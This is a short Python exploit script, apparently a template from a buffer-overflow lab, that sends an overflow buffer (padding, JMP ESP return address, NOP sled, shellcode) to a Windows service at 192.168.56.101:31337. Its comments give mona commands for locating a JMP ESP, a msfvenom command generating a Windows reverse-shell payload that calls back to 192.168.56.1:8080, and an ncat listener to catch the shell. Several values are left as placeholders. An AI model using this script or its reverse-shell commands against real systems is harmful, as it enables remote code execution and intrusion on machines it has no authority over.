#!/usr/bin/python3
# Get a reverse shell
# Useful mona commands :
# !mona modules
# !mona find -s "\xff\xe4" -m module
# Check the reverse shell's process' PID : tasklist
# Kill the reverse shell : taskkill /F /PID CALC_PID
# Catch the reverse shell : ncat -lnvp 8080
import socket

host = '192.168.56.101'
port = 31337

def send_buffer(buffer):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    print("Sending " + str(len(buffer)) + " bytes buffer")
    connect = s.connect((host, port))
    s.send(buffer + b"\r\n")
    print("Buffer sent")
    s.close()

# badchars = ""
# JMP ESP : 0x7dc794e3 => "\xe3\x94\xc7\x7d with little endianness
# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.56.1 LPORT=8080 -f c -e "x86/shikata_ga_nai" -b "\x00" 
buffer = b"A" * OFFSET + b"EIP_LITTLE_ENDIAN" + b"\x90" * 8 * DESIRED_PADDING + SHELLCODE
send_buffer(buffer)
print("Done")
